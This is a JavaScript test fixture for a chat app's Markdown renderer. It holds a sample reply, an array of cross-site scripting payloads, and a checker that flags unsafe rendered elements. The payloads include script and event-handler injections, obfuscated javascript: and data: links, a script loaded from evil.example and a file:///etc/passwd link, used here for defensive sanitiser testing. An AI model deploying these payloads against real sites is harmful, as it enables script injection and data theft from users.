// SPDX-License-Identifier: AGPL-3.0-or-later
// What the Markdown checks feed the renderer: a reply that uses every construct, the hostile texts, and the
// check that decides whether a rendered element is safe. Shared by the Node run (markdown-unit.mjs) and the
// browser run (chat-markdown.mjs).

export const SAMPLE = [
  "# Plan",
  "",
  "Here is **the summary** with *emphasis*, ~~old~~ and `inline code`, see [the docs](https://example.com/docs).",
  "",
  "- first **item**",
  "- second item",
  "",
  "1. one",
  "2. two",
  "",
  "| Item | Qty | Price |",
  "|:-----|----:|------:|",
  "| Rice | 2 | 1,200 |",
  "| Beans | 12 | 950 |",
  "",
  "```js",
  "const total = 2 * 3;",
  "```",
  "",
  "Done.",
].join("\n");

const PWN = "window.__pwned=1";

export const HOSTILE = [
  `<script>${PWN}</script>`,
  `<ScRiPt src=//evil.example/x.js></ScRiPt>`,
  `<img src=x onerror="${PWN}">`,
  `<img/src=x onerror=${PWN}>`,
  `<svg onload="${PWN}"></svg>`,
  `<iframe src="javascript:${PWN}"></iframe>`,
  `<a href="javascript:${PWN}">raw anchor</a>`,
  `<div onclick="${PWN}" style="position:fixed;inset:0">overlay</div>`,
  `<style>body{display:none}</style>`,
  `[js](javascript:${PWN})`,
  `[mixed](JaVaScRiPt:${PWN})`,
  `[entity](&#106;avascript:${PWN})`,
  `[tab](java&#9;script:${PWN})`,
  `[data](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19wd25lZD0xPC9zY3JpcHQ+)`,
  `[vb](vbscript:msgbox(1))`,
  `[file](file:///etc/passwd)`,
  `[relative](//evil.example/x)`,
  `<javascript:${PWN}>`,
  `[ref][1]\n\n[1]: javascript:${PWN}`,
  `![pixel](https://evil.example/track.png)`,
  `![js](javascript:${PWN})`,
  `[quote](https://example.com" onmouseover="${PWN})`,
  `[title](https://example.com "t\\" onmouseover=\\"${PWN}")`,
  `[<img src=x onerror=${PWN}>](https://example.com)`,
  "| <img src=x onerror=window.__pwned=1> | <b>bold</b> |\n|---|---|\n| <script>window.__pwned=1</script> | [x](javascript:window.__pwned=1) |",
  "```html\n<script>window.__pwned=1</script>\n```",
  "`<img src=x onerror=window.__pwned=1>`",
];

export const LONG_WORD = "A".repeat(400);

/** In the page: what is wrong with a rendered element. An empty list means it is safe. */
export function findings(root) {
  const bad = [];
  const forbidden = "script,iframe,object,embed,img,svg,style,link,meta,form,input,button,base,video,audio";
  for (const node of root.querySelectorAll(forbidden)) bad.push(`<${node.localName}> element`);
  for (const node of root.querySelectorAll("*")) {
    for (const { name } of node.attributes) {
      if (name.startsWith("on") || ["style", "srcdoc", "src", "formaction"].includes(name)) bad.push(`${name} attribute on <${node.localName}>`);
    }
  }
  for (const link of root.querySelectorAll("a")) {
    if (!/^(https?:|mailto:|tel:)/i.test(link.getAttribute("href") ?? "")) bad.push(`link to ${link.getAttribute("href")}`);
    if (link.target !== "_blank" || !/noopener/.test(link.rel) || !/noreferrer/.test(link.rel)) bad.push(`link ${link.href} without target and rel`);
  }
  if (window.__pwned) bad.push("a payload ran");
  return bad;
}
